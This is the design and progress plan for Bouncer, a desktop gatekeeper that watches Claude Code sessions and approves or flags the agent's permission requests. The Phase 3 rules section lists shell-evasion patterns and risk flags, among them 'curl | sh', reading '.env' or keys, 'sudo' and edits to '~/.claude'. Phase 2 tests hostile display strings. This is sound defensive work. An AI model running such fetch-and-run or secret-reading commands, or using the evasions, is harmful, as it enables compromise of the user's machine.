# Bouncer — MVP plan

Bouncer is a free, open-source desktop companion for Claude Code. It shows every
session live, auto-approves safe actions under rules you control, flags risky ones
with a plain reason, and never blocks the agent. A security guard for coding
agents, with personality. Ten phases (0–9), $0.

**Current phase: Roadmap c — Windows release, v0.7.0 (PRs c-1 to c-7 done 2026-10-13; next: tag v0.7.0 when Charan says, his real-desktop hand check, Publish — see "Roadmap c" under "Roadmap after Phase 6c")**

## MVP scope

| In the MVP | After the MVP |
| --- | --- |
| Live view of every Claude Code session (several at once) | A second agent (Codex CLI, Gemini CLI) |
| Approve or deny permission requests from the island | Approving from your phone |
| Rules engine: auto-allow safe actions, flag risky ones with a reason | Auto-update |
| Local activity log and a "while you were away" summary | Sitting exactly inside the MacBook notch |
| Bouncing-ball character and sounds, made in code (Phase 5) | Music on macOS |
| Chat through the local Claude Code, file drop, music on Windows (Phases 6–8) | Other integrations |

Events are normalized into one internal `Event` format from Phase 1, so a second
agent later is a new adapter, not a rewrite. The adapter abstraction is added only
when that second agent arrives.

## Architecture

```
Claude Code ──runs──▶ relay (bouncer-hook) ──user-only socket / pipe──▶ app core (Rust)
     ▲                                                                  ├─ rules engine (allow / ask + reason)
     │                                                                  ├─ activity log (local, redacted)
     │                                                                  ▼
     └──── allow / deny / nothing ◀──── relay ◀──── your click ──── island window
Fails safe: app missing or slow → relay prints nothing → Claude Code asks in the terminal.
```

## How every phase runs

1. **Audit** — read the docs and code the phase touches; write the threat list and
   "done when" criteria here before any code.
2. **Implement** — small commits, one concern each, in the order listed.
3. **Test** — unit tests, integration tests on recorded real hook payloads, a short
   manual script on a real machine.
4. **Verify** — security checklist, reread the whole diff, update docs.

Tags (Charan, 2026-10-12): a tag means a release. Merges are no longer
tagged; the release workflow runs only on `v*.*.*` tags created from v0.7.0
on (the old `v0.5.x` / `v0.6.x` tags never trigger it) and makes a draft
that Charan publishes.

---

## Setup — toolchain on Windows

- [x] Check versions: `git --version`, `node -v`, `rustc --version`, `cargo --version`, `winget --version`
- [x] Install what's missing (Charan approves each Windows admin prompt):
  - `winget install --id Rustlang.Rustup -e`
  - `winget install --id Microsoft.VisualStudio.2022.BuildTools -e --override "--wait --passive --add Microsoft.VisualStudio.Workload.VCTools --includeRecommended"`
  - `winget install --id OpenJS.NodeJS.LTS -e`
  - `winget install --id Git.Git -e` (if git is missing)
- [x] Close and reopen the terminal / Claude Code so PATH updates, then re-check versions
- [x] `rustup default stable` and `rustup component add clippy rustfmt`
- [x] WebView2 present (it ships with Windows 10/11)
- [x] Git identity set in the repo: `git config user.name` / `git config user.email`
- [x] Smart App Control off (Windows Security → App & browser control). In enforce
  mode it blocks freshly compiled Rust build scripts, so Tauri can't build.

## Phase 0 — Repo and guardrails (~2 days)

- **Audit:** check "bouncer" isn't used by another developer tool on GitHub,
  crates.io and npm (if taken, keep "Bouncer" as the app name and use `bouncer-app`
  for package names); read Tauri 2's security guide (capabilities, CSP).
- **Implement:** cargo workspace (`relay`, `core`, `app`), Tauri 2 scaffold with
  plain TypeScript, MIT `LICENSE`, `SECURITY.md`, `CREDITS.md`, `.gitignore`, README stub.
- **Test:** CI on Windows + macOS runs `cargo fmt --check`, `cargo clippy -D warnings`,
  `cargo test`, `cargo deny check`, `npm audit`, gitleaks; a weekly scheduled job
  runs `cargo deny check advisories`.
- **Verify:** Dependabot on; Actions pinned to commit SHAs; workflow
  `permissions: contents: read`; private vulnerability reporting on; branch
  protection on `main` (set after CI first runs): PR required (0 approvals), every
  CI job on both OSes a required check, branch up to date before merge, linear
  history, no force pushes or deletion, applies to admins. Signed commits: later.
- Commits: `chore: init workspace` → `chore: add tauri app shell` →
  `ci: add lint, test and audit workflow` → `docs: add license, security policy and readme stub`

### Phase 0 audit (2026-10-01)

Name: settled as `bouncer-app` (see Decisions). Versions today: `tauri` 2.12.1,
`tauri-build` 2.7.1, `@tauri-apps/cli` and `@tauri-apps/api` 2.12.1, Vite 8.3,
TypeScript 7.0, Rust 1.99.

What Tauri 2's security guide means for us:

- **Commands are open by default.** Every registered command can be called from
  every window unless `build.rs` lists them with
  `tauri_build::AppManifest::new().commands(&[...])` and a capability grants each
  one. Phase 0 registers no commands; Phase 2 must use the manifest from its first
  command.
- **Capabilities:** every file in `src-tauri/capabilities/` is enabled automatically.
  We keep exactly one file, bound to the `main` window, with no `remote` URLs.
- **The template is not secure as shipped.** `create-tauri-app` gives `"csp": null`,
  the `opener` plugin with `opener:default`, a sample `greet` command, a Vite dev
  server that listens on `TAURI_DEV_HOST`, and mobile-only crate types. All of that
  is removed.
- **CSP** goes in `app.security.csp`; Tauri adds hashes/nonces for bundled assets at
  build time. Ours: `default-src 'self'; script-src 'self'; style-src 'self';
  img-src 'self'; connect-src ipc: http://ipc.localhost; object-src 'none';
  base-uri 'none'; form-action 'none'; frame-ancestors 'none'`.
- Also set: `freezePrototype: true`. Leave as default: `withGlobalTauri: false`,
  `assetProtocol.enable: false`, no isolation pattern (we load no third-party
  frontend code). Devtools stay out of release builds (no `devtools` feature).
- Lifecycle: the dev server binds to localhost only; pin Actions to SHAs; audit both
  Rust and npm dependencies.

Phase 0 threats:

| Threat | Fix |
| --- | --- |
| Insecure template defaults ship (no CSP, opener plugin, sample command) | Strip them; CSP set; one minimal capability; reviewed in Verify |
| Any window can call any command | No commands in Phase 0; `AppManifest` allow-list from Phase 2 |
| Dev server reachable from the LAN | Vite `host` fixed to `localhost`, `strictPort` |
| Compromised or retagged GitHub Action | Every `uses:` pinned to a full commit SHA with a version comment; Dependabot updates them |
| CI token abused | Workflow-level `permissions: contents: read`; no secrets used |
| Vulnerable / unlicensed / non-crates.io dependency | `cargo deny check` (advisories, licenses, bans, sources: crates.io only); `npm audit`; lockfiles committed; `npm ci` in CI |
| Secret committed | gitleaks in CI on full history; GitHub secret scanning and push protection (already on) |
| Direct push or force push breaks `main` | Branch protection: PR + required checks, linear history, no force push/delete, admins included |
| New advisory lands between pushes | Weekly scheduled `cargo deny check advisories` |
| Vulnerability reported in public | `SECURITY.md` + private vulnerability reporting |
| Line-ending drift between Windows and macOS (fmt check, diffs) | `.gitattributes` with `* text=auto eol=lf` (Git for Windows sets `core.autocrlf=true` system-wide) |

Phase 0 is done when:

- [x] `cargo fmt --check`, `cargo clippy --all-targets -- -D warnings` and `cargo test`
      pass locally on Windows and in CI on `windows-latest` and `macos-latest`
- [x] Crates `bouncer-relay`, `bouncer-core`, `bouncer-app`; `relay` depends only on
      std + `serde_json`
- [x] `npm run tauri dev` opens an empty Bouncer window on Windows
- [x] `tauri.conf.json` has the CSP above and `freezePrototype: true`; no plugins; no
      commands; one capability file for `main` with the fewest core permissions that
      work; no `remote`
- [x] `cargo deny check`, `npm audit` and gitleaks pass in CI; the weekly
      advisories job exists
- [x] Every Action pinned to a SHA; workflow `permissions: contents: read`
- [x] Dependabot (cargo, npm, github-actions) and private vulnerability reporting
      are on; branch protection on `main` as listed under Verify
- [x] `LICENSE` (MIT), `SECURITY.md`, `CREDITS.md`, `README.md`, `.gitignore`,
      `.gitattributes` exist

Plan corrections found in this audit:

1. `cargo deny check` already checks the RustSec advisory database, which is what
   `cargo audit` does. Decision: drop `cargo audit`; add a weekly scheduled
   `cargo deny check advisories` job.
2. The plan didn't cover npm dependencies. Added `npm audit` and npm in Dependabot.
3. CI must build the frontend (`npm ci && npm run build`) before clippy and tests,
   because `tauri::generate_context!` fails to compile when `frontendDist` is missing.
4. Branch protection that requires status checks also blocks direct pushes to
   `main`. Decision: once protection is on, every change goes through a PR.
5. `.gitattributes` was missing from the file list.

## Phase 1 — Hook relay and local socket (~1 week)

- **Audit:**
  - Read https://code.claude.com/docs/en/hooks and record the exact stdin fields and
    exact allow/deny output for `PermissionRequest` and `PreToolUse`. Save real
    payloads from a playground session as test fixtures.
  - Confirm which events fire for actions Claude Code already allows by its own
    permission rules.
  - Pick the lowest supported Claude Code version (needs every hook we use) from the
    changelog; Bouncer tells users on older versions to update.
  - Study Coucou's relay deadlines and peer checks (github.com/Louis-CFM/coucou,
    `windows/hook/src/main.rs`).
- **Implement:**
  - `relay` binary: stdin capped at 1 MB, drop large fields (`tool_response`),
    connect within 300 ms, fire-and-forget within 2 s, permission requests wait up to 110 s.
  - Unix socket in a per-user `0700` folder (macOS); named pipe restricted to the
    user's SID (Windows); both ends verify same user.
  - Normalized `Event` struct (agent, session, project, tool, input, time).
  - `bouncer install-hooks` / `uninstall-hooks`: dated backup, merge only our
    entries, show diff, confirm, atomic write.
- **Test:** fixtures parse; app closed → exit < 50 ms with empty output; app hung →
  gives up at deadline; malformed or 5 MB input → clean exit; two sessions stream;
  install + uninstall leaves `settings.json` byte-identical.
- **Verify:** no default "allow"; another user cannot connect; no unconfirmed writes.
- Commits: `feat(relay): read and forward hook events` → `feat(core): normalized event model` →
  `feat(app): local socket server with peer check` → `feat(relay): wait for permission decisions with deadline` →
  `feat(cli): safe hook install and uninstall` → `test(relay): fixtures, timeouts and malformed input`

### Phase 1 audit (2026-10-01)

Sources: code.claude.com/docs/en/hooks, the Claude Code `CHANGELOG.md`, Coucou's
`windows/hook/src/{main,win}.rs`, and payloads recorded in `../bouncer-playground`
(its own `.claude/settings.local.json`; user settings untouched).

What Claude Code sends and accepts:

- Every hook gets JSON on stdin with `session_id`, `transcript_path`, `cwd`,
  `hook_event_name`, usually `permission_mode`, plus per-event fields.
  `PreToolUse` / `PermissionRequest` add `tool_name`, `tool_input`, `tool_use_id`
  (`PermissionRequest` may add `permission_suggestions`); `PostToolUse` adds
  `tool_response` (can be a whole file); `UserPromptSubmit` adds `prompt`.
- Exit 0 + empty stdout = "no decision", Claude Code carries on normally. Exit 2
  blocks on `PreToolUse` (we never use it); other non-zero codes are logged errors.
- `PermissionRequest` allow:
  `{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}`;
  deny: same with `{"behavior":"deny","message":"..."}`. We send no `updatedInput`
  and no permission updates.
- `PreToolUse` fires before every tool call, including ones Claude Code's own rules
  already allow; `PermissionRequest` fires only when Claude Code would show a
  dialog. So: Bouncer observes everything via `PreToolUse` (prints nothing) and
  answers only `PermissionRequest`.
- Hooks for one event run in parallel; the default command timeout is 600 s
  (since 2.1.3). We set `timeout` explicitly anyway: 120 s for
  `PermissionRequest` (above our 110 s wait), 5 s for the rest.
- Exec form (`"command": <path>, "args": []`, since 2.1.139) spawns the relay
  without a shell, so paths with spaces ("Full Time") and shell differences
  (Git Bash vs PowerShell on Windows) don't matter.
- Hooked events: `SessionStart`, `SessionEnd`, `UserPromptSubmit`, `PreToolUse`,
  `PostToolUse`, `PermissionRequest`, `Notification`, `Stop`.

Lowest supported Claude Code version: **2.1.139** — `PermissionRequest` exists
since 2.0.45, the fix stopping hook "allow" from bypassing `deny` rules landed in
2.1.77, and exec-form `args` arrived in 2.1.139.

From Coucou (studied, not copied): 300 ms connect / 2 s fire-and-forget / 110 s
decision budgets enforced by the main thread with `recv_timeout` (a worker does the
blocking I/O and is abandoned on overrun); SID in the pipe name; relay checks the
pipe server's SID via `GetNamedPipeServerProcessId`; only exact, known answers
print anything. Differences: Coucou truncates long strings, which could show a
user a cut-off command to approve — Bouncer forwards inputs whole and drops the
event instead if stdin exceeds 1 MB; Bouncer also restricts the pipe's DACL and
checks the client on the server side.

Transport:

- Windows: `\\.\pipe\bouncer-<SID>`, created with DACL `D:P(A;;GA;;;<SID>)`,
  `FILE_FLAG_FIRST_PIPE_INSTANCE` (fails if someone squatted the name) and
  `PIPE_REJECT_REMOTE_CLIENTS`. Server checks the client process's SID, relay checks
  the server's. Win32 via `windows-sys` (decision below).
- macOS: `~/Library/Application Support/Bouncer/bouncer.sock` (was
  `$TMPDIR/bouncer-<uid>/`, changed after review: `$TMPDIR` can differ between
  the GUI app and a terminal); the app creates the folder `0700`
  and refuses to use one that is a symlink, not ours, or open to others. Both ends
  compare `getpeereid` with `getuid` (two hand-declared libc functions).
- Wire: the relay sends one JSON line; for `PermissionRequest` the app answers one
  line, exactly `allow` or `deny`. Anything else, EOF or timeout → nothing printed.
- The server lives in `bouncer-core` (`ipc` module) so relay integration tests can
  run a real server; the app only starts it. `BOUNCER_ENDPOINT` overrides the
  path in debug/test builds only (peer checks still apply).
- `bouncer install-hooks` / `uninstall-hooks` is a small `bouncer` binary in
  `bouncer-core` (the app is a GUI-subsystem exe on Windows and can't prompt in a
  console). It targets `~/.claude/settings.json` (or `$CLAUDE_CONFIG_DIR`) unless
  `--settings <file>` is given. Our entries = hook commands whose file name is
  `bouncer-hook[.exe]`.

Phase 1 threats:

| Threat | Fix |
| --- | --- |
| Relay prints "allow" by mistake | Only an exact `allow` line from a verified app, only for `PermissionRequest`; every other path prints nothing; tests assert empty stdout |
| App missing / slow / hung blocks Claude Code | 300 ms connect, 2 s fire-and-forget, 110 s decision; main thread never blocks on I/O; exit 0 always |
| Another user answers or reads events | User-only DACL / `0700` folder; SID / uid check on both ends |
| Pipe-name squatting (Windows) | SID in name, `FIRST_PIPE_INSTANCE`, relay checks server SID |
| Socket folder swapped for a symlink (macOS) | `symlink_metadata`, owner and mode checked before bind |
| Huge or malformed stdin | 1 MB cap → drop event; parse failure → exit 0; `tool_response` dropped |
| User approves a truncated command | No per-field truncation; whole event or nothing |
| Settings file damaged or clobbered | Dated backup, merge only our entries, diff shown, `y` required, atomic rename; key order kept (`serde_json` `preserve_order`) |
| Uninstall removes user hooks | Only entries pointing at `bouncer-hook` removed; containers removed only if we emptied them |
| Shell injection via install path | Exec form, no shell |
| Hooks fire inside the Claude Code session building Bouncer | Recording and manual tests only in `../bouncer-playground` |

Phase 1 is done when:

- [x] Relay: stdin > 1 MB, malformed JSON, missing fields, app closed → empty
      stdout, exit 0; app closed exits fast (measured: ~25 ms median on Windows,
      including process start)
- [x] Hung app: fire-and-forget gives up at 2 s; decision budget is 110 s (tested:
      still waiting after 3 s; the 110 s value itself is a constant, not run)
- [x] Real recorded payloads (playground) are fixtures and parse into `Event`
- [x] `allow`/`deny` from the app print the documented JSON; anything else prints
      nothing; non-`PermissionRequest` events never print
- [x] Two sessions stream concurrently to one server
- [x] Pipe DACL / socket folder mode set; peer check on both ends (code + test of
      the own-user path; another-user path reviewed by hand). Live pipe read back
      as `D:P(A;;FA;;;<own SID>)`, protected, one entry
- [x] install + uninstall leaves a settings file byte-identical; backup written;
      no write without `y`; user hooks untouched
- [x] Manual: real `PermissionRequest` allowed end to end, and unanswered → normal
      terminal prompt (playground, Claude Code 2.1.143 — first written down as
      2.1.287, corrected after review)
- [x] Manual: real `PermissionRequest` denied end to end (playground, default
      permission mode: Claude Code showed "Denied in Bouncer", file not created)
- [x] fmt, clippy, tests green locally and in CI (Windows + macOS)

Manual checks (playground `../bouncer-playground`; version read from each
session transcript's `"version"` field):

- 2026-10-02, Claude Code 2.1.143 (session `c419a738`): a real Write
  `PermissionRequest` allowed through Bouncer; unanswered requests fell back to
  the terminal prompt; `git status` (allowed by Claude Code) fired only
  `PreToolUse`. Fixtures: `claude-code-2.1.143-*` (12).
- 2026-10-02, Claude Code 2.1.287 (session `4936ec29`, `auto` mode): Bash tool
  events only; no `PermissionRequest` fired. Fixtures: `claude-code-2.1.287-*`.
- 2026-10-02, Claude Code 2.1.287 (session `c6c7d2ff`, `default` mode): a real
  Write of `deny-test.txt` denied through Bouncer; Claude Code showed "Denied in
  Bouncer" and the file wasn't created. Fixture:
  `claude-code-2.1.287-PermissionRequest-Write.json` (+ its `PreToolUse`,
  `Notification`). Automated equivalent: `permission_answers_print_the_documented_json`.

Plan corrections found in this audit:

1. Relay dependencies: std + `serde_json` + `windows-sys` (Windows only).
   Decision (Charan): `windows-sys` 0.61 — already in `Cargo.lock` via Tauri.
2. The socket server goes in `bouncer-core`, not `bouncer-app` (testability); the
   CLI is a `bouncer` binary in `bouncer-core`.
3. Hook timeouts must be set explicitly; exec form needs Claude Code ≥ 2.1.139.
4. "Drop large fields" means drop `tool_response` and refuse > 1 MB, not truncate.
5. (Verify) The relay first read stdin outside the deadline; a stdin left open
   would have hung it until Claude Code's hook timeout. Fixed and tested.

### Phase 1 review follow-ups (2026-10-02, on `phase-2`)

From Charan's review of PR #2, each a separate commit with tests:

1. `BOUNCER_ENDPOINT` is honored only in debug/test builds; CI also runs the
   relay's unit tests in release to prove release ignores it.
2. Settings backups (and the replacement file) get the original's permissions
   before any byte is written.
3. macOS socket moved to `~/Library/Application Support/Bouncer/` (fixed per
   user). Socket paths are limited to 104 bytes; that leaves room for user names
   up to ~48 characters, and a longer one makes `bind` fail safe.
4. `CLAUDE_CONFIG_DIR` is respected (it already was) and now tested end to end;
   an empty value no longer means `./settings.json`.
5. The 2.1.143 fixture names were right. The nine "2.1.287" fixtures were
   recorded by a session still running 2.1.143 (transcript `"version"` field);
   renamed, and ten real 2.1.287 recordings added. A test ties each fixture name
   to its recording session's version. The allow-path manual test also ran on
   2.1.143; the deny-path one ran on 2.1.287.

Also fixed: a race in two relay tests that counted events before the server's
handler thread had run.

## Phase 2 — Island window and manual approvals (~1.5 weeks)

- **Audit:** Tauri window options (transparent, always on top, no taskbar icon, no
  focus stealing); list every IPC command needed and nothing more.
- **Implement:** states hidden / peek / open; session list by session ID; approval
  card (agent, project, tool, full command in monospace, Allow once / Deny); queue
  with count, nothing dropped; decisions bound to single-use request IDs; tray menu
  (Pause, Settings, Quit).
- **Test:** approve and deny real requests; unanswered → terminal prompt after
  deadline; three sessions; `<script>`, ANSI escapes and right-to-left Unicode show
  as inert text.
- **Verify:** CSP `script-src 'self'`, no remote content; capabilities limited to our
  commands (no shell, no fs plugin); `textContent` only; idle CPU ~0%; Allow buttons
  arm after 600 ms, Allow is never default focus, Enter does not approve.
- Commits: `feat(app): island window shell` → `feat(ui): session list` →
  `feat(ui): approval card and queue` → `feat(app): request-bound decisions` →
  `feat(app): tray menu` → `test(ui): hostile command rendering`

### Phase 2 audit (2026-10-02)

Sources: Tauri 2.12 config schema and source (`tauri`, `tao` 0.37), Phase 0/1 notes.

Window (`main`, the island):

- `visible: false` at start, `decorations: false`, `resizable: false`,
  `alwaysOnTop: true`, `skipTaskbar: true`, `visibleOnAllWorkspaces: true`,
  `dragDropEnabled: false`, no maximize/minimize/close buttons.
- **No focus stealing:** `focus: false` covers only the first show. On Windows
  tao clears its "don't focus" marker after creation, so every later `show()`
  uses `SW_SHOW` and activates the window; on macOS `show()` is
  `makeKeyAndOrderFront`. So the window is `focusable: false`: it never takes
  keyboard focus, and clicks still work (`acceptFirstMouse` on macOS).
  Keystrokes stay in the terminal, so Enter can never approve. Trade-off: the
  island has no keyboard access; Phase 5 (accessibility) revisits it.
- macOS: activation policy `Accessory` (no Dock icon).
- **No transparency:** `transparent` needs `macOSPrivateApi` on macOS. The
  island is an opaque undecorated window instead.
- Placement: top centre of the primary monitor's work area, re-centred on
  every resize. Sizes: hidden (no sessions), peek (a pill), open (a panel that
  scrolls inside).

IPC (every command listed in `build.rs`'s `AppManifest` and granted in the one
capability; no core permissions, no plugins):

| Command | What | Why it's safe |
| --- | --- | --- |
| `subscribe(channel)` | Backend pushes the island view (sessions, queue, paused) on every change | Read-only; Tauri's channel fetch is exempt from the ACL by design |
| `decide(id, allow)` | Answers one queued request | Only a live, unused, backend-issued ID works; Allow refused < 600 ms after the card is issued |
| `expand(open)` | Peek / open when the pill is clicked | Only toggles our own window size |
| `drag()` | Moves the island while the mouse is held (added after Charan's playground test: the island covered a terminal's tab bar) | Only moves our own window; no `core:window` permission given to the page |
| `fit(width, height)` | The page reports its content size; the window follows (sizes live only in `src/styles.css`) | Clamped to 80×24 … 900×900 logical px; placement always inside the work area |

The frontend gets no window, event, shell, fs or opener permissions; the
backend resizes and shows the window itself. The frontend uses `@tauri-apps/api`
(approved by Charan, 2026-10-02) for `invoke` and `Channel` only.

Decisions and queue (`bouncer-core`, `approvals` module, testable without Tauri):

- Each permission request gets a 128-bit ID: two `RandomState` (OS-seeded
  SipHash) hashes of a counter. std only; IDs never leave the process. Single
  use: removed on decide, timeout or pause.
- The connection thread waits on its own channel up to **100 s**, below the
  relay's 110 s budget (`bouncer_relay::DECISION_BUDGET`, now shared). On
  timeout the card is removed and nothing is answered, so the terminal asks.
- FIFO queue across sessions, unbounded, nothing dropped; the card shows "1 of N".
- Pause (tray): every queued request is released unanswered and new ones aren't
  queued, so all go to the terminal. The tray tooltip says "paused" and the
  tray icon becomes a greyed copy made in code. Sessions keep updating.
- Sessions keyed by session ID: project, last tool, state (working / needs
  you / idle); removed on `SessionEnd`.

Rendering (security rule 4):

- Every agent string is set with `textContent`. On top of that, the backend
  makes invisible characters visible before display: C0/C1 controls (ANSI
  escapes), bidi controls (U+202A–202E, U+2066–2069, U+200E/200F, U+061C) and
  zero-width characters become `\u{XXXX}`, so a command can't hide or reorder
  text. The command block is `direction: ltr; unicode-bidi: isolate`.
- Bash shows `tool_input.command`; other tools show `tool_input` as pretty
  JSON, in full (scrolls; never cut).
- A test fails if `src/` uses `innerHTML`, `outerHTML`, `insertAdjacentHTML` or
  `document.write`.
- Allow is disabled for 600 ms each time a new card reaches the front and is
  never focused; the window can't take keys at all.

Phase 2 threats:

| Threat | Fix |
| --- | --- |
| Script / markup injection from a command or path | `textContent` only; CSP `script-src 'self'`; test bans HTML sinks |
| ANSI / bidi / zero-width tricks hide what's approved | Escaped to visible `\u{XXXX}` before display; LTR isolate |
| Forged or replayed decision | Random single-use IDs from the backend; unknown or used ID → error, nothing answered |
| Click lands on the wrong card (queue shifts) | Decision names the ID shown; 600 ms re-arm when the front card changes |
| Accidental approval | 600 ms arm (UI and backend), no focus, no Enter |
| Window steals focus, keystrokes land in the island | `focusable: false` |
| Island blocks Claude Code | 100 s wait < 110 s relay budget; pause and quit release everything |
| Requests lost | Unbounded FIFO; timeout and pause fall back to the terminal, never "allow" |
| Frontend reaches more than it needs | Four commands in the manifest; no core/plugin permissions; no remote URLs |
| Command truncated | Full input shown, scrolls |

Phase 2 is done when:

- [x] Island window: hidden / peek / open; top centre; on top; no taskbar
      entry; never takes focus
- [x] Session list keyed by session ID (rows show folder + current step, per
      Charan); three concurrent sessions shown
- [x] Approval card (agent, project, tool, full command in monospace, Allow once /
      Deny), queue with count, nothing dropped
- [x] Decisions bound to single-use IDs (unit tests: unknown, replayed, early
      Allow, timeout, pause)
- [x] Tray: Pause/Resume (icon and tooltip show paused) and Quit
- [x] Hostile strings (`<script>`, ANSI, RTL override, zero-width) render as
      inert visible text (core tests + manual check)
- [x] End-to-end test: real relay → server → queue → decide → relay prints the
      documented JSON
- [x] Manual: real request approved and denied from the island; unanswered →
      terminal prompt after the deadline; three playground sessions
- [x] CSP unchanged; capability = our five commands only; no plugins;
      measured 0 ms CPU over 10 s at idle (app + 6 WebView processes); idle CPU ~0%
- [x] fmt, clippy, tests green locally and in CI (Windows + macOS)

Manual checks:

- 2026-10-02, no Claude Code (debug relay fed by a script; three fake sessions):
  peek pill at top centre, always on top, never foreground. A queued `Bash`
  request with `<script>`, ANSI and U+202E showed as inert text with
  `\u{001B}` / `\u{202E}` markers. An unanswered request timed out and the relay
  printed nothing.
- 2026-10-02, same setup, Charan clicked Deny (window temporarily focusable):
  card cleared, island shrank to the pill, relay printed the documented deny JSON.
- 2026-10-02, same setup, final `focusable: false`: Charan typed in another
  app, clicked Deny once, kept typing. One click was enough, keyboard focus never
  left the other app, and the relay printed deny.
- 2026-10-02, same setup, tray: Pause turned the icon grey and the tooltip to
  "Bouncer (paused): Claude Code asks in the terminal"; a request while paused
  showed no card and the relay exited empty in 316 ms; the pill read "Paused".
  Resume restored the colour icon, the "Bouncer" tooltip and cards.
- 2026-10-02, same setup, Charan clicked Allow once: one click, card cleared,
  relay printed the documented allow JSON. Charan noticed "1 need you" left over
  from the request sent while paused; fixed (`asks in terminal`) and covered by
  `pause_releases_the_queue_and_queues_nothing`.
- 2026-10-02, Claude Code 2.1.287, playground (sessions `35fc5f3e`, `34088e44`,
  `a8abef54`, default mode): a real Write allowed from the island
  (`island-allow.txt` created); a real Write denied ("Denied in Bouncer",
  `island-deny.txt` absent); an unanswered request (13:16:43) fell back to
  Claude Code's own prompt and was answered there (file written 13:18:34);
  three sessions at once, two requests queued 12 s apart and both allowed.
  Fixture: `claude-code-2.1.287-PostToolUse-Write.json`. Found: the island
  covered the terminal's tab bar and couldn't be moved → `drag`.
- 2026-10-02, debug relay fed by a script: Charan dragged the island, clicked
  it open in place, closed it back to the same spot. Found: opened near a
  corner it went off screen → clamped to the work area (`island_stays_on_screen`);
  dragged under the taskbar it couldn't be reached → pushed back inside on every
  move. The "C:workdrag-test" label was the test command losing backslashes
  (checked; `windows_paths_reach_the_island_intact` guards our side).
- 2026-10-02, debug relay fed by a script, two monitors: Charan dragged the pill
  between screens and back. Found: the taskbar guard stopped it crossing
  monitors → it now acts only when the centre is out of reach
  (`reachable_points_need_no_push`). Found: the guard fought the drag over the
  taskbar (stutter) → it now runs after the island is still for 400 ms; a short
  settle delay near the taskbar is expected. Taskbar recovery and tray Quit
  confirmed. Stress: 60 concurrent relays (20 sessions) done in 1.7 s, app
  responsive.

Plan corrections found in this audit:

1. Tray "Settings" moves to Phase 5 with the settings screen (Charan).
2. Transparent window dropped (needs the macOS private API).
3. "Enter does not approve" is guaranteed by `focusable: false`; keyboard access
   to the island becomes a Phase 5 accessibility item.
4. New dependency: `@tauri-apps/api` 2.12.1 (Charan approved). Tauri's
   `tray-icon` feature is turned on; it adds no crates to `Cargo.lock`.
5. Known limit: if a relay dies while its card is up (Claude Code killed), the
   card stays until the 100 s deadline; deciding it then does nothing.
6. (Implement) Added `drag` and `fit` commands, sticky placement clamped to the
   work area, and island sizes set only in `src/styles.css` (Charan: behavior
   now, looks later from `design/prototype/`).
7. (Implement) Sessions that never send `SessionEnd` (crashed, or test feeds)
   stay listed until the app restarts. Expiring idle sessions is left for the
   activity-log work (Phase 4).
8. (Verify) Window work from relay threads could deadlock against `fit` on the
   main thread; all window work now runs on the main thread.

### Island restyle to the prototype (2026-10-02, branch `design-island`)

`design/prototype/bouncer-island.html` is the visual source of truth (Charan).
The Phase 2 island was rebuilt to it without changing queue or decision logic.
States built: Hidden (180×5 wake strip, hover 300 ms peeks the pill), Idle pill,
Working pill (rotates every 4 s with several busy sessions), Sessions, Approval,
Approval · queue, Paused, Session detail, Approve an edit. Later states (Risky,
Auto-allowed, Away summary, Chat, File drop, Music) wait for their phases.

Decisions:

- Syntax colors: a small built-in tokenizer (`src/tokenize.ts`: Rust, TS/JS,
  Python, Go, JSON, shell), returning text pieces, never HTML; tested with
  Node's built-in runner (`npm test`, also in CI). No dependency (Charan).
- Session detail's tab bar is hidden until its tabs work; only a close button
  for now. Chat comes in Phase 6, Sound and Settings in Phase 5 (Charan).
- Transparent, rounded window. Charan asked for `macOSPrivateApi` on macOS only.
  In Tauri 2.12.1 that flag is a no-op at runtime (transparency is always
  available) and only drives a build-time feature check that reads one shared
  `Cargo.toml`, so a macOS-only flag would fail the Windows build. It is left
  off. `ROUNDED` in `crates/app/src/main.rs` switches a platform to square
  corners on a solid window if transparency fails. **Mac test:** check rounded
  corners, the shadow, and that nothing opaque shows around the island.
- Diffs come from the hook's own `old_string` / `new_string` / `content`
  (`bouncer-core::code`), never by reading files; line numbers count within the
  change. Paths inside the project show relative to it.
- The window keeps 20 px each side and 32 px below the island for its shadow.
  That band is transparent but still takes clicks (WebView2 has no per-pixel
  hit testing); kept small on purpose.
- Bouncer is built element by element (`src/ball.ts`); the prototype's static
  SVG markup string isn't used, so no HTML string ever reaches the page.
- The approval head has no close button (the prototype shows one, but closing
  can't dismiss a pending request, so it would be a dead button).
- The detail rail shows real past steps and how each got through (Claude Code,
  you allowed / denied, waiting for you, asked in terminal); the prototype's
  future steps ("cargo test", "Done") can't be known and aren't shown.

Manual checks:

- 2026-10-02, debug relay fed by a script, Windows: every built state captured
  from the real window next to the prototype (in the PR). Fixed on the way: a
  long path widened the diff pane and pushed Deny / Allow edit out of view;
  Write cards now show path, blank line, content as the prototype.
- Dev only: two quick hot reloads can leave the old page's `subscribe` last, so
  updates go to a dead page until the next reload. Not reachable outside dev.
- Review of #5 (Charan): the WebView2 debug port used for the captures was set
  inline for one dev run only (not in the user or machine environment; checked
  in the registry). Release builds now clear `WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS`
  at startup. Session detail groups repeated steps ("Searching ×3"), shows the
  latest 6 with "+N earlier", and marks Edit diffs "Excerpt" (checked in the
  real window).

## Phase 3 — Rules engine (~1.5 weeks)

Outcomes: auto-allow (logged), ask with a risk reason, or ask plainly. Nothing is
auto-denied in the MVP; anything not fully understood goes to the user.

- **Audit:** list Claude Code's own permission rules so ours complement them; collect
  evasion examples (`;`, `&&`, `|`, `$(...)`, backticks, `eval`, `bash -c`, aliases,
  `env` tricks, Unicode lookalikes) as test cases.
- **Implement:** `rules.toml` in the user config folder with shipped defaults;
  proper shell-word parser; compound commands auto-allowed only if every part is;
  unparseable → ask; paths fully resolved, outside the project → ask; risk flags
  with one-line reasons (deletes outside project, `.env`/keys, `curl | sh`,
  `git push --force`, `sudo`, shell profiles, `~/.claude`); observe mode by default;
  "Always allow" previews the exact rule.
- **Test:** 150+ case table incl. every evasion example; fuzz test: random input
  never crashes and never auto-allows.
- **Verify:** rules file refused if others can write it; rule changes shown in the
  island; observe mode default on fresh install.
- Commits: `feat(rules): rule file format and defaults` → `feat(rules): command parser and compound handling` →
  `feat(rules): path checks` → `feat(rules): risk flags with reasons` →
  `feat(ui): observe mode and always-allow preview` → `test(rules): case table and fuzzing`

### Phase 3 audit (2026-10-02)

Sources: Phase 1 notes on Claude Code hooks and permission modes, the Phase 2
desk, `design/prototype/bouncer-island.html` (Risky request, Auto-allowed), the
Phase 2 review note on request IDs.

